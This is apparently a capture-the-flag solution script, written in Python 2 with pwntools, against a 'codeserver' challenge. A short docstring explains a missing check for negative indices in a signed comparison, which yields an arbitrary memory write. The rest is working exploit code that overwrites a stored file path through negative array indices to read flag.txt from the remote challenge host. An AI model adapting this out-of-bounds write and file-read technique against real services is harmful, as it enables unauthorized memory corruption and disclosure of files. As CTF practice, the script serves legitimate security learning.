#!/usr/bin/env python2

"""
Bad validation on the index into the codes array. It does a signed <=
comparison with the max value, but doesn't check for negative values.
We can supply a negative value to get an arbitrary dword write anywhere
in memory below the global array.

Overwrite the codes filepath at the start of the array for an arbitrary
file read. Good enough to get the flag - no need for RCE.
"""

from pwn import *

#context.log_level = "debug"

conn = remote("challenge.acictf.com", 14000)
#conn = process("./codeserver")

def set_code(idx, value):
    conn.sendline("2")
    conn.recvuntil("(1-10)? ")
    conn.sendline(str(idx))
    conn.recvuntil("what? ")
    conn.sendline(str(value))
    conn.recvuntil("Quit\n")


def read_file(filename):
    """Overwrite the codes path with a file we're interested in."""
    filename += "\x00"
    filename += "\x00" * (4 - (len(filename) % 4))
    chunks = [filename[i:i+4] for i in xrange(0, len(filename), 4)]
    for i, chunk in enumerate(chunks):
        set_code(i-1024+1, u32(chunk))

    conn.sendline("3")
    contents = conn.recvuntil(" What would you like", drop=True)
    conn.recvuntil("Quit\n")
    return contents


def main():
    conn.recvuntil("Quit\n")
    flag = read_file("flag.txt")
    log.success("Flag: {:s}".format(flag))


if __name__ == "__main__":
    main()
